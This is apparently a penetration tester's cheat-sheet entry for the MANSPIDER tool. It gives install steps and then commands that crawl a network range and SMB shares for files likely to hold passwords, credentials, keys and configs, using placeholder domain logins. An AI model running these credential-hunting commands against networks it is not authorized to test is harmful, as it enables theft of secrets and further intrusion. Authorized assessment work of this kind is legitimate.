## Installation
```sh
(Optional) Install these dependencies to add additional file parsing capability:
# for images (png, jpeg)
$ sudo apt install tesseract-ocr

# for legacy document support (.doc)
$ sudo apt install antiword
Install manspider (please be patient, this can take a while):

$ pip install pipx
$ pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
```

## [[Credentials]]
Search the network for filenames that may contain creds
>manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password

Search for XLSX files containing "password"
>manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password

Search for interesting file extensions
> manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password

```meta
requirements: 
results: 
opsec: 
oss: #py
source: https://github.com/blacklanternsecurity/MANSPIDER
description: Spider entire networks for juicy files sitting on SMB shares. Search filenames or file content - regex supported!
```